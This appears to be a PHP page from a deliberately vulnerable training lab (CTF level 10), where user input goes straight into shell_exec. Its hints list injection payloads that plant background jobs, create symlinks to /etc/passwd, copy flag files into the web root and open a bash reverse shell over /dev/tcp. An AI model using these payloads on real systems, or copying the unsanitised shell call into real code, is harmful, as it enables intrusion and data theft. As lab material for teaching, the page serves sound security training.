<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 10 - Race Condition & Automation</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🏁 Level 10 - Race Condition & Automation</h1>
            <p><strong>Objective:</strong> Khai thác race conditions và automated injection attacks</p>
        </div>

        <div class="form-container">
            <h3>🔍 Batch Process Manager:</h3>
            <p>Hệ thống xử lý batch jobs với rate limiting. Chỉ cho phép 1 request mỗi 2 giây.</p>
            
            <div class="code-block">Command: timeout 1s ps aux | grep <?php echo htmlspecialchars($_GET['process'] ?? '[PROCESS]'); ?></div>
            
            <?php
            session_start();
            
            if (isset($_GET['process'])) {
                // Initialize level-specific flag access
                require_once 'flag_system.php';
                get_level_flag(10);
                
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $process = $_GET['process'];
                $current_time = time();
                
                // Rate limiting - only allow 1 request per 2 seconds
                if (isset($_SESSION['last_request']) && 
                    ($current_time - $_SESSION['last_request']) < 2) {
                    
                    $wait_time = 2 - ($current_time - $_SESSION['last_request']);
                    echo '<div class="error">⏰ Rate limit exceeded. Please wait ' . $wait_time . ' seconds.</div>';
                    echo '<div class="error">🚫 Request blocked by rate limiter</div>';
                } else {
                    // Update last request time
                    $_SESSION['last_request'] = $current_time;
                    
                    // Execute command with timeout
                    $command = "timeout 1s ps aux | grep " . $process;
                    $output = shell_exec($command . " 2>&1");
                    
                    if ($output) {
                        echo '<pre>' . htmlspecialchars($output) . '</pre>';
                    } else {
                        echo '<div class="success">✅ No matching processes found</div>';
                    }
                }
                
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Input:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="process">Process Name:</label>
                    <input type="text" id="process" name="process" value="<?php echo htmlspecialchars($_GET['process'] ?? ''); ?>" placeholder="Enter process name (e.g., apache)" oninput="updateCommand()">
                </div>
                <button type="submit" class="btn">🚀 Search Process</button>
            </form>

            <div class="info-card" style="margin: 20px 0;">
                <h3>⏰ Rate Limiting Scenario</h3>
                <ul>
                    <li><strong>Rate limit:</strong> 1 request per 2 seconds per session</li>
                    <li><strong>Timeout:</strong> Commands automatically killed after 1 second</li>
                    <li><strong>Challenge:</strong> Bypass rate limiting and execute longer commands</li>
                    <li><strong>Real-world:</strong> Many APIs and services use rate limiting</li>
                </ul>
            </div>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🏁 Race Condition Techniques</h3>
                <ul>
                    <li><strong>Session manipulation:</strong> Reset or modify session state</li>
                    <li><strong>Parallel requests:</strong> Send multiple requests simultaneously</li>
                    <li><strong>Background processes:</strong> Start long-running tasks</li>
                    <li><strong>File locking races:</strong> Exploit file system race conditions</li>
                    <li><strong>TOCTOU attacks:</strong> Time-of-check to time-of-use</li>
                </ul>
            </div>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding Rate Limiting</h4>
                    <p><strong>Current Command:</strong> <code>timeout 1s ps aux | grep [PROCESS]</code></p>
                    <p>📝 <strong>Test normal:</strong> <code>apache</code> (works first time)</p>
                    <p>📝 <strong>Test rate limit:</strong> Submit again immediately (blocked)</p>
                    <p>🎯 <strong>Goal:</strong> Bypass the 2-second cooldown and 1-second timeout</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Session Bypassing</h4>
                    <p><strong>Concept:</strong> Rate limiting is based on PHP sessions</p>
                    <p>📝 <strong>Method 1:</strong> Clear session data in your payload</p>
                    <p><code>apache; unset $_SESSION; session_destroy()</code> (won't work - server-side)</p>
                    <p>📝 <strong>Method 2:</strong> Use browser incognito/new session</p>
                    <p>📝 <strong>Method 3:</strong> Delete browser cookies manually</p>
                    <p>🎯 <strong>Alternative:</strong> Reset session using command injection itself</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Background Process Injection</h4>
                    <p><strong>Concept:</strong> Start background processes that survive timeout</p>
                    <p>📝 <strong>Method:</strong> <code>apache; (sleep 10; whoami > /var/www/html/whoami.txt) &</code></p>
                    <p>🎯 <strong>Explanation:</strong> & runs process in background, survives 1s timeout</p>
                    <p><strong>Verification:</strong> Wait 10+ seconds, then check <code>http://localhost:8080/whoami.txt</code></p>
                    <p><strong>Advanced:</strong> <code>apache; nohup cp /var/flags/level10_race.txt /var/www/html/ &</code></p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Parallel Request Attack</h4>
                    <p><strong>Concept:</strong> Send multiple requests simultaneously to exploit race conditions</p>
                    <p>📝 <strong>Manual method:</strong> Open multiple browser tabs/windows</p>
                    <p>📝 <strong>Submit simultaneously:</strong> Click submit in all tabs at same time</p>
                    <p>🎯 <strong>Goal:</strong> Some requests might bypass rate limiting due to timing</p>
                    <p><strong>Tool suggestion:</strong> Use Burp Suite Intruder or curl in parallel</p>
                    <p><code>curl "http://localhost:8080/level10.php?process=apache" &</code></p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>💡 Hint 5: File-based Race Condition</h4>
                    <p><strong>Concept:</strong> Exploit temporary file operations</p>
                    <p>📝 <strong>Create temp file:</strong> <code>apache; echo "command" > /tmp/cmd.sh</code></p>
                    <p>📝 <strong>Make executable:</strong> <code>apache; chmod +x /tmp/cmd.sh</code></p>
                    <p>📝 <strong>Execute later:</strong> <code>apache; bash /tmp/cmd.sh &</code></p>
                    <p>🎯 <strong>Race window:</strong> File might execute between creation and cleanup</p>
                </div>
                <div id="hint-6" class="hint-box" style="display: none;">
                    <h4>💡 Hint 6: TOCTOU (Time-of-Check-Time-of-Use)</h4>
                    <p><strong>Concept:</strong> Exploit gap between security check and execution</p>
                    <p>📝 <strong>Method:</strong> <code>apache; ln -sf /var/flags/level10_race.txt /tmp/safe.txt</code></p>
                    <p>🎯 <strong>Explanation:</strong> Create symlink after validation but before use</p>
                    <p><strong>Advanced:</strong> <code>apache; (sleep 0.5; ln -sf /etc/passwd /tmp/safe.txt) & cat /tmp/safe.txt</code></p>
                    <p><strong>Timing attack:</strong> Race between link creation and file access</p>
                </div>
                <div id="hint-7" class="hint-box" style="display: none;">
                    <h4>💡 Hint 7: Persistent Background Shell</h4>
                    <p><strong>Concept:</strong> Establish persistent access that survives rate limits</p>
                    <p>📝 <strong>Method:</strong> <code>apache; bash -i >& /dev/tcp/0.0.0.0/4444 0>&1 &</code></p>
                    <p>🎯 <strong>Note:</strong> This tries to create a reverse shell (may not work in container)</p>
                    <p><strong>Alternative:</strong> <code>apache; while true; do date >> /var/www/html/heartbeat.txt; sleep 5; done &</code></p>
                    <p><strong>Check progress:</strong> Monitor <code>http://localhost:8080/heartbeat.txt</code></p>
                </div>
                <div id="hint-8" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 8: Extract the Flag with Race Condition!</h4>
                    <p><strong>🚀 Target file:</strong> <code>/tmp/level10_flag.txt</code></p>
                    <p><strong>Method 1 (Background copy):</strong></p>
                    <p><code>apache; (sleep 3; cp /tmp/level10_flag.txt /var/www/html/) &</code></p>
                    <p><strong>Method 2 (Parallel requests):</strong></p>
                    <p>Submit multiple times with: <code>apache; cat /tmp/level10_flag.txt > /var/www/html/flag.txt &</code></p>
                    <p><strong>Method 3 (TOCTOU):</strong></p>
                    <p><code>apache; (ln -sf /tmp/level10_flag.txt /var/www/html/race_flag.txt) &</code></p>
                    <p><strong>🎯 Expected Flag:</strong> <code>FLAG{race_condition_automation_bypass}</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="level9.php">⬅️ Previous Level</a>
            <a href="index.php">🏠 Home</a>
            <a href="submit.php?level=10">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 8;

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint === maxHints) {
                document.querySelector('.hint-btn').style.display = 'none';
            }
        }
    }

    function updateCommand() {
        const process = document.getElementById('process').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = `Command: timeout 1s ps aux | grep <span style="color: #ed8936; font-weight: bold;">${process || '[PROCESS]'}</span>`;
    }
    </script>
</body>
</html>
